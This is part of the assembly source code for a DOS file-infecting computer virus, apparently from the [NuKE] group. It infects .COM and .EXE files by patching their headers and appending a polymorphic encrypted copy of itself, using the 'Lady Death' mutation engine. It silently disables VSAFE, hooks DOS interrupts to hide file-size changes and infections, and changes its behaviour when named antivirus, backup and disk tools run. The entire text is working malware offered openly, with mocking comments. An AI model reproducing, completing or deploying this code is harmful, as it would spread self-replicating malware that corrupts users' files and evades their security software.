                pop     ds

                mov     byte ptr [di+2],02              ;Set to Read + Write

                mov     al,byte ptr [di+4]              ;Get attribute
                test    al,040
                je      RunInfection

                jmp     Close_File1

RunInfection:
                mov     byte ptr [di+4],0               ;clear attributes

                push    cs,cs
                pop     ds,es

                or      al,040                          ;Mask infection
                mov     byte ptr [OldAttrib],al         ;Store it for later

                mov     ax,05700
                int     21h
                mov     word ptr [FileStamp],cx         ;Date + Time save
                mov     word ptr [FileStamp+2],dx

                mov     ah,03fh                         ;Read in the header
                mov     cx,018h
                mov     dx,offset Buffer
                call    $Call_Int21

                cld
                mov     si,dx
                mov     di,offset Buffer2
                rep     movsb

                mov     si,offset Buffer2+0Eh   ;Save needed information
                mov     di,offset OldHostCode1

                movsw                           ;SS
                movsw                           ;SP
                lodsw                           ;CRC
                movsw                           ;IP
                movsw                           ;CS

                mov     cl,3                    ;Set for .EXE infection

                mov     si,dx
                add     dx,offset "ZM"-Buffer   ;Dangme with the anti tbflag
                cmp     word ptr [si],dx                ;code! Why do i need it
                je      DontFixCOMHeader        ;when were encrypted? hehehe
                                                ;Oh, i remeber ;) stupd "#"
                movsw
                movsw
                movsw

                mov     di,offset HostSS
                mov     word ptr [di + Buffer-HostSS], 0a0d
                mov     word ptr [di + Buffer-HostSS+2], 0e920

                mov     ax,0fff0

                stosw
                xchg    cx,ax
                mov     ax,0fffe
                stosw
                mov     ax,0100
                stosw
                xchg    cx,ax
                stosw

                ;CL = 0 from the XCHG 0100      ;Set for .COM infection

DontFixCOMHeader:
                mov     byte ptr [SkipPutBack],cl

                mov     ax,04202                ;Pointer to the end
                xor     cx,cx
                cwd
                int     021

                cmp     dx,8                    ;Too big for our .exe file
                jb      HighSizeOK

                jmp     Close_File1

HighSizeOK:
                cmp     byte ptr [Buffer],0d
                je      AintNoEXE

                push    ax
                and     ax,0f                   ;Gimme lowbits fer me offset
                mov     word ptr [InstPointer],ax
                pop     ax

                push    ax, dx

                mov     cx,512
                div     cx
                or      dx,dx
                je      $+2
                inc     ax
                cmp     [(ExeSizeMOD512)+2],ax
                je      GoodEXEHeader1
BadEXEHeader:
                pop     dx, ax
                jmp     Close_File1

GoodEXEHeader1:
                cmp     [(ExeSizeMOD512)+0],dx
                jne     BadEXEHeader

GoodEXEHeader2:
                add     word ptr [(EXESizeMod512)+2],(VirLenX/512)
                add     word ptr [(EXESizeMod512)+0],VirLenX-(VirLenX/512*512)

                pop     dx, ax

                mov     cx,4
                shr     dx,1                    ;Roundhouse kick to the
                rcr     ax,1                    ;segment descriptor
                loop    $-4

                sub     ax,word ptr [HeaderParagraphs]
                mov     word ptr [CodeSegment],ax
                add     ax,VirMem/2                     ;fix the Stack Segments
                mov     word ptr [StackSeg],ax
                mov     word ptr [StackPointer],512     ;Enuff space.
                add     word ptr [MinMem],VirMem/2      ;Gimme more memory!
                jnc     DontFixMemory
                sub     word ptr [MinMem],Virmem/2
DontFixMemory:
                mov     ax,word ptr [InstPointer]       ;Restore Delta ofsset
                inc     cx                              ;set cx=1 for DS!=CS
                jmp     WriteMe

AintNoEXE:
                sub     ax,06
                mov     word ptr [Buffer+4],ax
                add     ax,0106
                                                ;cx should be 0 already
WriteMe:
                push    bx                      ;Save handle
                                                ;AX is our infection IP
                mov     bx,VirLen + 030
                mov     si,offset Virus_Start
                mov     di,offset PolyBuffer
                call    MightyMorphinFacialCode ;Poly the virus
                sub     cx,030
                pop     bx                      ;Restore handle

                mov     ah,040                  ;Save me code in the fridge
                Call    $Call_Int21             ;for later.

                ;CX = Virus code written to host, now we must sub it from
                ;     the fixed size to get how much padding we must do.

                mov     cx,VirLenX - Buflen
                sub     cx,ax
                add     dx,di                   ;AL into the poly buffer.
                mov     ah,040
                call    $Call_Int21

                mov     ah,040                  ;Save me a stubby
                mov     cx,BufLen
                mov     dx,offset Buffer2
                Call    $Call_Int21

                mov     ax,04200                ;Pointa to start
                xor     cx,cx
                cwd
                int     021

                mov     ah,040                  ;Save the stub
                mov     cl,018
                mov     dx,offset buffer

;We shouldnt need this next bit coz we dont modify anything in the .com
;block save the first 3 bytes......  but we got a damnable error somewhere!
;.Com files <18h will be killed..... duh! shoulda seen that comming.

                mov     si,dx
                cmp     byte ptr [si],0d
                jne     $+4
                mov     cl,6

                call    $Call_Int21

                mov     ax,05701                ;Save me time and date o
                mov     cx,word ptr [FileStamp]         ;creation
                mov     dx,word ptr [FileStamp+2]
                int     21h

                call    HandleToSFT

                mov     al,byte ptr [OldAttrib]
            es: mov     byte ptr [di+4],al

Close_File1:
                mov     ah,03e                  ;Close me
                int     21h

Bad_File1:
                call    SetInt24h               ;Gimme i21h back
                call    Vsafe_Toggle            ;Reset VSAFE

                in      al,021
                and     al,0fd                  ;Okey, givem back the keyboard
                out     021,al

                call    restore_regs            ;Gimme regs back too
                popf
                ret                             ;Ret me.

;---------------------------------------------------------------------------

HandleToSFT:
                push    ax,bx
                mov     ax,01220h
                int     02Fh

                xor     bx,bx
            es: mov     bl,byte ptr [di]

                mov     ax,01216h
                int     02Fh

                pop     bx,ax
                ret

;------------------------------------------------------------------------------

;This routine will save all the registers
Save_Regs:
                pusha
                push    es
                push    ds
                mov     bp,sp
                jmp     word ptr [bp+20]

;This routine will restore all the registers from a Save_Regs
Restore_Regs:
                pop     bx
                mov     bp,sp
                mov     word ptr [bp+20],bx
                pop     ds
                pop     es
                popa
                ret

;------------------------------------------------------------------------------

;This routine TOGGLES all of VSAFE's modes to off, then next time its called
;it will turn them all back on, without alerting the user to its absence in
;memory, or causing alarms, much better than 0FA01h

;This is a flip-flop function, first time it is called it will be disabled,
;the second time its called it will be re-enabled, and so on.

VSafe_Toggle:
                call    save_regs

                mov     ax,0fa02h
                db      0b3h                    ;mov bl,##
VSafe_Bits:     db      0
                mov     dx,"EY" - 0fa02         ;Eli Yuval?
                add     dx,ax
                int     13h
                jc      NoVsafe

            cs: mov     byte ptr [VSafe_Bits], dl
NoVsafe:
                call    restore_regs
                ret

;------------------------------------------------------------------------------

GetInt24h:
                push    ax
                push    ds

                xor     ax,ax
                mov     ds,ax

                mov     ax,offset Int24Handler
                xchg    ax,word ptr [024h*4]
            cs: mov     word ptr [Int24h],ax
                mov     ax,cs
                xchg    ax,word ptr [024h*4+2]
            cs: mov     word ptr [Int24h+2],ax

                pop     ds
                pop     ax
                ret

;------------------------------------------------------------------------------

SetInt24h:
                push    ax
                push    ds

                xor     ax,ax
                mov     ds,ax

            cs: mov     ax,word ptr [Int24h]
                xchg    ax,word ptr [024h*4]
            cs: mov     ax,word ptr [Int24h+2]
                xchg    ax,word ptr [024h*4+2]

                pop     ds
                pop     ax
                ret

;------------------------------------------------------------------------------

Int24Handler:
                mov     al,3
                iret

;------------------------------------------------------------------------------

;No, I'm not japanese, I just happen to love anime+manga
;Wanted: Bottled Ecchi hahhaha
;Free Plug [DiskMagazineGenerator v1.04] a wicked piece of coding from me ;)

;------------------------------------------------------------------------------

CheckFileName:
                ;ds:dx = filename
                call    save_regs

                push    cs
                pop     es

                mov     si,dx

ResetBufferOffset:
                mov     di,offset buffer2
GetChar:
                lodsb                           ;Get me byte
                cmp     al,060
                jb      $+8
                cmp     al,07f
                ja      $+4
                and     al,0df                  ;Squeeze me byte
            es: mov     byte ptr [di+22],al     ;save for mcb stealth!
                stosb                           ;Save me byte

                cmp     al,"\"                  ;Covers the directory
                je      ResetBufferOffset
                cmp     al,":"                  ;Covers the drive
                je      ResetBufferOffset

                or      al,al
                jne     GetChar

                mov     cx,7                    ;clear it out
                repnz   stosb

                push    cs
                pop     ds

                mov     si,offset ModeChangeFiles
                xor     cx,cx

CheckName:
                add     si,cx
                mov     di,offset buffer2
                xor     cx,cx
                lodsb
                mov     cl,al
                shr     al,3
                and     cl,0111xb

                jcxz    NoMoreNames

                repe    cmpsb
                jne     CheckName

                mov     byte ptr [StatusBits],al

NoMoreNames:

                call    restore_regs
                ret

;------------------------------------------------------------------------------
;
;Bitsettings+stringlength, string
;See StatusBits for bit settings
;
;The bit settings are * by 8 to give us the bottom 3 bits for our string count
;and the string count can't be bigger than 7......
;
;We check for the following bits of filename from the begining
;and if found then we set out StatusBits to the bits set here.
;This way we can easily modify what mode the virus is in,
;down side is that if the filenames are changed so that chkdsk is called
;checkds then were screwed. ;( oh well, you can count the smart users on
;1 hand thesedays.
;
;
;Time for one last comment before the code ends.  N3k0, I am not a Hentai,
;and yes, I do know what it means.  Yeah, I do have an asoko, I am mokkori
;after all! hehehehehehe.  I should stop reading this damn manga!
;Oishii!
;

ModeChangeFiles:
                db 00010101xb*8+3,"PKZ"
                        ;PKzip, PKZipfix
                        ; StealthFCB+DTA off
                        ; StealthStamp off
                        ; StealthRead off
                        ; FastInfection on

                db 00010101xb*8+3,"ARJ"
                        ;Arj
                        ; StealthFCB+DTA off
                        ; StealthStamp off
                        ; StealthRead off
                        ; FastInfection on

                db 00010101xb*8+3,"LHA"
                        ;LHA, LHarc
                        ; StealthFCB+DTA off
                        ; StealthStamp off
                        ; StealthRead off
                        ; FastInfection on

                db 00010101xb*8+3,"RAR"
                        ;RAR
                        ; StealthFCB+DTA off
                        ; StealthStamp off
                        ; StealthRead off
                        ; FastInfection on

                db 00010101xb*8+3,"MSB"
                        ;MsBackup
                        ; StealthFCB+DTA off
                        ; StealthStamp off
                        ; StealthRead off
                        ; FastInfection on

                db 00010101xb*8+3,"CPB"
                        ;Central Point Backup
                        ; StealthFCB+DTA off
                        ; StealthStamp off
                        ; StealthRead off
                        ; FastInfection on

                db 00010101xb*8+3,"BAC"
                        ;Backup
                        ; StealthFCB+DTA off
                        ; StealthStamp off
                        ; StealthRead off
                        ; FastInfection on

                db 00000001xb*8+3,"NDD"
                        ;Norton Disk Doctor
                        ; StealthFCB+DTA off
                        ; StealthStamp off

                db 00000011xb*8+3,"CHK"
                        ;Chkdsk         (Like Edit to Edlin, each to his own)
                        ; StealthFCB+DTA off
                        ; StealthStamp off
                        ; MCB memory stealth

                db 00000001xb*8+5,"SCAND"
                        ;Scandisk
                        ; StealthFCB+DTA off
                        ; StealthStamp off

                db 00000001xb*8+4,"SPEE"
                        ;Speedisk
                        ; StealthFCB+DTA off
                        ; StealthStamp off

                db 00000001xb*8+3,"DEF"
                        ;Defrag
                        ; StealthFCB+DTA off
                        ; StealthStamp off

                db 00010000xb*8+2,"SC"
                        ;Scan (McAfee)
                        ; Fast infection on

                db 00010000xb*8+2,"VE"
                        ;Vet Anti-Virus (Aw Fuck, Roger, Vet is the biggest
                        ;piece of shit!)
                        ; Fast infection on.

                db 00001000xb*8+2,"IV"
                        ;Invercible     (Hahahahaah, is IV a trojan or what? ;)
                        ; Infect files off

                db 00010000xb*8+2,"F-"
                        ;F-Prot (Shit dude, /Analyse is killed by a JMP $+2..)
                        ; Fast infection on

                db 00001000xb*8+2,"AV"
                        ;AVPro + AVPTsr, etc    (Thanks for the trojan.avb)
                        ; Infect files off

                db 00001000xb*8+2,"TB"
                        ;TBav family of programs. To be on the safe side, turn
                        ;off infection
                        ; Infect files off... but if they use "own" well..
                        ;   not much we can do.. didnt want to waste code with
                        ;   a "dos" to "own" code conversion.

                db 00010000xb*8+2,"LI"
                        ;List.com (its a great vector)
                        ; Fast infection on

                db 00010000xb*8+2,"T."
                        ;T.com (its what i call list.com)
                        ; Fast infection on

                db 00000010xb*8+3,"MFT"
                        ;Manifest
                        ; MCB memory stealth

                db 00000010xb*8+2,"SI"
                        ;SysInfo ??? (Filename from an article in VLAD)
                        ; MCB memory stealth

                db 00000010xb*8+2,"MI"
                        ;Memory Info ??? (Filename from an article in VLAD)
                        ; MCB memory stealth

                db 00000010xb*8+4,"SYSI"
                        ;SysInfo by Norton
                        ; MCB memory stealth

                db 00000010xb*8+3,"MEM"
                        ;Mem from messydos
                        ; MCB memory stealth

                db 0    ;no more filenames to check

ModeFilesLen equ $ - ModeChangeFiles

; -----------------------------------------------------------------------------

comment  %

include [LADYDETH.PLY]

Lady Death's cosmetic kit,
  Yes, it changes the face of your virus, takes those unencrypted wrinkles
  out of your life, Lady Death's cosmetic kit works wonders on memory resident
  .COM and .EXE infectors, making them look more complex than they really are,
  we here at [NuKE] will garuntee that your virus will have that
  "just encrypted" look that every young encrypted virus has, or we'll give
  you your un-encrypted virus back, free of charge.

%

;Do you think I have watched too many Oli of Olay adds?

;call with
; es:di = output buffer
; ds:si = input buffer
;    ax = delta offset
;    bx = length to crypt
;    cl = flags
;         00000001 = DS+ES != CS (.EXE files)

;Returns
;    cx = Total encrypted code length + decryption routine
; ds:dx = Decryption routine + encrypted code

MightyMorphinFacialCode:
                mov     word ptr [ladyd_delta],ax
                mov     word ptr [ladyd_length],bx
                mov     byte ptr [ladyd_status],cl
                push    es
                push    di

                xor     bp,bp

GetJumpMask:
                in      al,040
                and     al,(TotalLoops/8*8)+8-1
                cmp     al,TotalLoops
                ja      GetJumpMask

                mov     byte ptr [Ladyd_Jump_Mask],al

                in      al,040
                and     al,011xb
                mov     cl,al

                mov     bx,0011010101110110xb
                ;          bx--bp--di--si--
                ;This is the POINTER for the decryption

                mov     byte ptr [ladyd_pointer2],al

                shl     cx,2
                shr     bx,cl
                and     bl,01111xb
                mov     dh,bl

get_poin_reg:
                in      al,040
                and     al,0111xb
                cmp     al,dh
                je      get_poin_reg
                cmp     al,04                   ;sp
                je      get_poin_reg

                mov     dl,al

                ;dl = intel bit specs for COUNTER
                ;dh = intel bit specs for POINTER

                mov     word ptr [ladyd_counter],dx

                ;decide what to set first, pointer or counter?

                mov     byte ptr [Mov_Fix],0eb
                call    do_garbage
                call    do_garbage
                mov     byte ptr [Mov_Fix],077

                call    do_garb

                mov     cx,word ptr [ladyd_length]
                mov     bx,word ptr [ladyd_delta]

                push    bx
                xor     bx,bx
                mov     bl,byte ptr [ladyd_jump_mask]
                shl     bx,1
                mov     bx,word ptr [bx+loop_jumps]

                xor     ax,ax
                test    bl,l_sign
                je     j_NoSign
                mov     ah,080
j_NoSign:
                test    bl,l_cadd
                je      j_NoCounterAdd
                add     ax,cx
j_NoCounterAdd:
                test    bl,l_csub
                je      j_NoCounterSub
                sub     ax,cx
j_NoCounterSub:
                test    bl,l_aone
                je      j_NoAddOne
                inc     ax
j_NoAddOne:
                test    bl,l_sone
                je      j_NoSubOne
                dec     ax
j_NoSubOne:
                mov     cx,ax
                pop     bx

                in      al,040                  ;swapped bx + dx around.
                test    al,1
                xchg    ax,dx
                je      SwivvelItRound

                call    set_reg
                call    do_garb
                xchg    al,ah
                xchg    cx,bx
                call    set_reg
                mov     word ptr [ladyd_adjuster],di
                jmp     DoneSwivvellenIt

SwivvelItRound:
                xchg    al,ah
                xchg    cx,bx
                call    set_reg
                mov     word ptr [ladyd_adjuster],di
                xchg    cx,bx
                xchg    ah,al
                call    do_garb
                call    set_reg

DoneSwivvellenIt:
                test    byte ptr [ladyd_status],1
                je      SkipEXEStuff

                in      al,040
                test    al,1
                je      SkipEXEStuff

                call    do_garb

                xor     byte ptr [ladyd_status],1
                mov     ax,01f0e

                cmp     byte ptr [ladyd_pointer2],2
                jne     SavePushPop

                mov     ah,017                  ;50% chance of push cs, pop ss
                                                ;50% of push cs, pop ds
SavePushPop:                                    ;50% of CS:
                stosw

SkipEXEStuff:
                push di

                call    do_garb
                                                ;now create the cryption
                test    byte ptr [ladyd_status],1
                je      NoEXEBitMarker

                mov     al,02e                  ;save CS:
                stosb
;                xor byte ptr [ladyd_status],1

NoEXEBitMarker:
                in      al,040
                and     al,011xb            ;111xb

                mov     ah,al
                mov     al,080

                stosb
                mov     dh,al

                                                ;dh = crypt type
                                                ;80 = 4 byters = 80, reg+ ##,##
                                                ;80 = 4 byters = 80, reg+ ##,##
                                                ;80 = 4 byters = 80, reg+ ##,##

                mov     cx,2        ;2 data
                mov     bx,offset ladyd_crypt_type2

                cmp     ah,2
                jb      KeepCryptType

                mov     bx,offset ladyd_crypt_type3

KeepCryptType:
                in      al,040
                and     al,1
                xlatb

                mov     dl,al
                mov     byte ptr [ladyd_type],dl        ;44=add,6c=sub,74=xor
                add     al,byte ptr [ladyd_pointer2]
                stosb
                in      al,040
                xchg    al,ah
                in      al,040
                                                        ;al = idex adjuster
                                                        ;ah = cypher value
                mov     byte ptr [ladyd_cypher],ah
                push    ax

KeepChuggenBytes:
                stosb
                xchg    al,ah
                dec     cx
                jnz     KeepChuggenBytes

                call    do_garb
                pop     ax

                mov     bx,word ptr [ladyd_adjuster]
                                                        ; 080 to 0ff =
                                                        ; -80 to -01
                                                        ; 000 to 07f =
                                                        ; +00 to +7f
                not     al
                cbw
                inc     ax

                add     word ptr [bx-2],ax

                mov     ax,word ptr [ladyd_counter]
                xchg    al,ah

                xor     bx,bx
                mov     bl,byte ptr [ladyd_jump_mask]
                shl     bx,1
                mov     bx,word ptr [bx+loop_jumps]
                add     ax,04040
                test    bl,l_dec
                je      DontIncCounter
                add     ah,08

DontIncCounter:
                stosb                                   ;move pointer
                xchg    al,ah

                call    do_garb

                stosb                                   ;move counter

                mov     al,bh
                stosb                                   ;CondJump opcode

NoGetMask:
                pop     bx
                mov     ax,di
                sub     ax,bx
                not     ax
                stosb                                   ;backward jump

                push    di                              ;garble it.
                mov     cx,word ptr [ladyd_length]
                mov     bx,word ptr [ladyd_cypher]

                ;44=add,6c=sub,74=xor
                mov     al,034
                mov     ah,bl

                cmp     bh,074                      ;xor, so xor
                je      ladyd_fixcypher

                mov     al,02c
                cmp     bh,044
                je      ladyd_fixcypher

                ;bh = 6c
                mov     al,04

Ladyd_fixcypher:
                mov     word ptr [screw_code],ax

                db      0eb,0                        ;PIQ killer.

GimmeByteToCrypt:
                lodsb

screw_code:
                nop                             ;Hey, dont fuck with the NOPS
                nop                             ;They is powerful instructions.

                stosb
                loop    GimmeByteToCrypt

                mov     si,di
                pop     di                      ;di = end of crypt routine.

                mov     bx,word ptr [ladyd_adjuster]

                mov     cx,si           ;end of total encryption
                pop     dx,ds           ;original es:di
                sub     cx,dx           ;total_encryption end-encryption_start

                sub     di,dx           ;encr_loop - encryption_start

                ;cx = total_encryption length
                ;di = length of encryption loop (sort of)

                add     word ptr [bx-2],di

                ;   cx = total length
                ;ds:dx = output buffer
                ret

set_reg:
                call    do_lea
                jz      NoDoLea

                add     al,0b8
                stosb
NoDoLea:
                xchg    cx,ax
                stosw
                xchg    cx,ax
                ret

check_regs:
                ;check the garbling regs in AL with POINTER + COUNTER
                ;we need to check the 3 bits.
                push    ax
                mov     ah,al
                and     ah,011xb

                mov     al,byte ptr [ladyd_counter]
                and     al,011xb
                cmp     al,ah
                je      ItsUsed

                mov     al,byte ptr [ladyd_pointer]
                and     al,011xb
                cmp     al,ah

ItsUsed:
                pop     ax
                ret

do_garb:
                pusha

GimmeMore:
                in      al,040
                and     ax,(PolyAnd/8*8)+8-1
                cmp     ax,PolyAnd          ;makes 1 or 2 instructions.
                ja      GimmeMore

                xchg    cx,ax

MoreGarbage:
                push    cx
                call    do_garbage
                pop     cx
                dec     cx
                jns     MoreGarbage

                mov     bp,sp
                mov     word ptr [bp],di
                popa
                ret

do_lea:
                push    bx
                xor     bx,bx

                push    ax
                in      al,040

                cmp     al,256/4
                ja      LeaNoChance

                mov     al,08d
                stosb

                pop     ax
                push    ax

                and     al,0111xb
                shl     al,3
                add     al,6
                stosb
                inc     bx              ;use for flag

LeaNoChance:
                pop     ax
                dec     bx              ;use for flag
                pop     bx
                ret

;-------------------------------

;Free Chitsukeilen for all females!
;ehehehe, go look that one up in your dictionary!
;*NB* There is no direct translation of that word.
;Thanks to DNAB from "Kiechiis Bloody Sunday" an Ah My Goddess lemon fanfic
;for increasing my japanese vocab by another word.

;-------------------------------

do_garbage:
                in      ax,040
                aad

                cmp     al,156
Mov_Fix:        ja      do_mov_garb

                cmp     al,56
                ja      do_2_garb

;if al > 156    (100)           ;25:64 % of a mov reg,#### cmd
;if al > 56     (100)           ;25:64 % of a reg,reg cmd
;        0      (56)            ;14:64 % of 1 byte instruction

;-------------------------------

do_1_garb:
                mov     bx,offset ladyd_1_junk
                in      al,040
                and     al,011xb
                xlatb
                stosb
                ret

do_mov_garb:
                push    bx

                in      al,040
                and     ax,01000xb
                mov     cx,ax
                shr     cx,3

                add     al,0b0
                mov     ah,al

GimmeMoreRegs:
                in      al,040
                and     al,0111xb
                call    check_regs
                je      GimmeMoreRegs

                add     al,ah
                cmp     al,0bc      ;sp
                je      GimmeMoreRegs

                or      cx,cx
                je      RegNoLea

                call    do_lea
                jz      FillValues

RegNoLea:
                stosb

FillValues:
                in      al,040
                stosb
                dec     cx
                jns     FillValues

                pop     bx
                ret

do_2_garb:
                in      al,040
                mov     ah,al
                and     ah,0111xb
                cmp     ah,4                        ;sp
                je      do_2_garb

                or      al,0c0

                call    check_regs
                je      do_2_garb

                mov     ah,al

                in      al,040
                mov     bl,al
                in      al,040
                and     al,0111xb
                cmp     al,6                ;no CMP xx,xx
                ja      do_2_garb

                shl     al,3
                test    bl,1
                je      $+3

                inc     ax

                stosb
                xchg    al,ah
                stosb
                ret

ladyd_crypt_type2:      db      044,06c              ;add, sub
ladyd_crypt_type3:      db      074,074              ;xor, xor
ladyd_jump_mask:        db      0
ladyd_1_junk:           db      090,0f8,0fb,0fc

;ladyd_2_junk:       ;add,or,adc,sbb,and,sub,xor,cmp
                        ;add    ax    cx    dx    bx    sp    bp    si    di
                        ;  01   c0-c8 c9-cf d0-d8 d9-df e0-e8 e9-ef f0-f8 f9-ff
                        ;or
                        ;  09             x0 = ax = 000
                        ;adc              x1 = cx = 001
                        ;  11             x2 = bx = 010
                        ;sbb              x3 = dx = 011
                        ;  19             x4 = sp = 100
                        ;and              x5 = bp = 101
                        ;  21             x6 = si = 110
                        ;sub              x7 = di = 111
                        ;  29
                        ;xor
                        ;  31
Loop_Jumps:
                l_sign  equ 00000001xb  ;sign
                l_cadd  equ 00000010xb  ;counter add
                l_csub  equ 00000100xb  ;counter sub
                l_aone  equ 00001000xb  ;add 1
                l_sone  equ 00010000xb  ;sub 1
                l_inc   equ 01000000xb  ;inc flow of counter
                l_dec   equ 10000000xb  ;dec flow of counter

TotalLoops      equ     12 - 1          ;(We start from 0)

                 ;jno = loop while no overflow
                 ;      count = 8000 + (count-1)
                 ;      dec counter
                db l_dec+l_sign+l_cadd+l_sone, 071

                 ;jno = loop while no overflow
                 ;      count = 8000 - count
                 ;      inc counter
                db l_inc+l_sign+l_csub, 071

                 ;jne = loop while not 0
                 ;      count = 0 + count
                 ;      dec counter
                db l_dec+l_cadd, 075

                 ;jne = loop while not 0
                 ;      count = 0 - count
                 ;      inc counter
                db l_inc+l_csub, 075

                 ;js  = loop while sign is on, so count=count+08000
                 ;      count = 8000 + (count - 1)
                 ;      dec counter
                db l_dec+l_sign+l_cadd+l_sone, 078

                 ;js  = loop while sign is on, so count= 0-count
                 ;      count = 0 - count
                 ;      inc counter
                db l_inc+l_csub, 078

                 ;jns = loop while no sign
                 ;      count = 0 + (count - 1)
                 ;      dec counter
                db l_dec+l_cadd+l_sone, 079

                 ;jns = loop while no sign
                 ;      count = 8000 - count
                 ;      inc counter
                db l_inc+l_sign+l_csub, 079

                 ;jge = loop while greater than and equal to
                 ;      count = 0 + (count - 1)
                 ;      dec counter
                db l_dec+l_cadd+l_sone, 07d

                 ;jge = loop while greater than and equal to
                 ;      count = 8000 - (count - 1)
                 ;      inc counter
                db l_inc+l_sign+l_csub+l_sone, 07d

                 ;jg  = loop while greater than
                 ;      count = 0 + count
                 ;      dec counter
                db l_dec+l_cadd,07f

                 ;jg  = loop while greater than
                 ;      count = 8000 - (count - 1)
                 ;      inc counter
                db l_inc+l_sign+l_csub+l_sone, 07f

; -----------------------------------------------------------------------------

Int_Table:
                db      011h            ;Find First FCB stealth
                dw      StealthSizeFCB
                db      012h            ;Find Next FCB stealth
                dw      StealthSizeFCB
                db      04Eh            ;Find First Handle stealth
                dw      StealthSizeDTA
                db      04Fh            ;Find Next Handle stealth
                dw      StealthSizeDTA

                db      03fh            ;Read file into memory stealth
                dw      StealthReadFile
                db      040h            ;Write file disinfection
                dw      DisinfectFile
                db      043h            ;Attribute Function stealth
                dw      StealthAttrib

                db      06Ch            ;Extended Open Fast Infection
                dw      ExtendedOpen
                db      03d             ;Normal Open Fast Infection
                dw      InfectVector1

                db      04Bh            ;Exec Slow Infection
                dw      InfectVector

                db      04c             ;Quit prog
                dw      QuitVector
                db      031             ;Resident prog
                dw      QuitVector

                db      0               ;End of table

;The old host code we have to replace
OldHostCode1:
HostSS:         dw      0FFF0h          ;SS
HostSP:         dw      0FFFEh          ;SP
HostIP:         dw      0100h           ;IP
HostCS:         dw      0FFF0h          ;CS
HostOrig:       db      0b8,001,04c     ;Old .COM host bytes
                db      0cd,021,090     ;In its current structure, this data
                                        ;MUST immediatley follow the HostCS

StatusBits:     db 00000000xb
                  ;       1    = StealthFCB+DTA Size off, Stamp off
                  ;      1     = MCB memory stealth
                  ;     1      = Stealth read off
                  ;    1       = Infect Files off
                  ;   1        = Fast Infection on
                  ;xxx         = Reserved!
;Can't use the top 3 bits in this vers ;)

Virus_End:
VirLen equ Virus_End - Virus_Start

Buffer2:
                        db 018 dup (?)  ;the EXE header we don't modify
BufLen equ $ - Buffer2

VirLenX equ VirLen + PolySize + BufLen  ;This is the length we substract
                                        ;for find stealth.
                                        ;Virus length, plus a copy of the
                                        ;unaltered header, plus the maximum
                                        ;size of the generated polymorph code.

Buffer:
MZHEader:               dw ?            ;The EXE header we DO modify
EXESizeMod512:          dd ?            ;2
NumRels:                dw ?            ;6
HeaderParagraphs:       dw ?            ;8
MinMem:                 dw ?            ;10
MaxMem:                 dw ?            ;12
StackSeg:               dw ?            ;14
StackPointer:           dw ?            ;16
CheckSum:               dw ?            ;18
InstPointer:            dw ?            ;20
CodeSegment:            dw ?            ;22

OldAttrib:              db ?            ;24
FileName:               dd ?            ;25
FileStamp:              dd ?            ;29
Int21h:                 dd ?            ;33
Old21h:                 dd ?            ;37
Int24h:                 dd ?            ;41

ladyd_counter:          db ?            ;44
ladyd_pointer:          db ?            ;45
ladyd_pointer2:         db ?            ;46
ladyd_delta:            dw ?            ;47
ladyd_length:           dw ?            ;49
ladyd_adjuster:         dw ?            ;51
ladyd_cypher:           db ?            ;52
ladyd_type:             db ?            ;53
ladyd_status:           db ?            ;54

PolyBuffer:                             ;This is the buffer for the polygen

VirMem equ (($-Virus_Start)/16) * 2     ;How much prgs do we need to save

db VirLenX - $ dup ?                    ;Makes the raw .com the same size as
                                        ;an infection.. ;) so i dont have to
                                        ;convert hex numbers, etc to find out
                                        ;its exact infection size.... ;)
;Hehehehe, no more quips I promise!
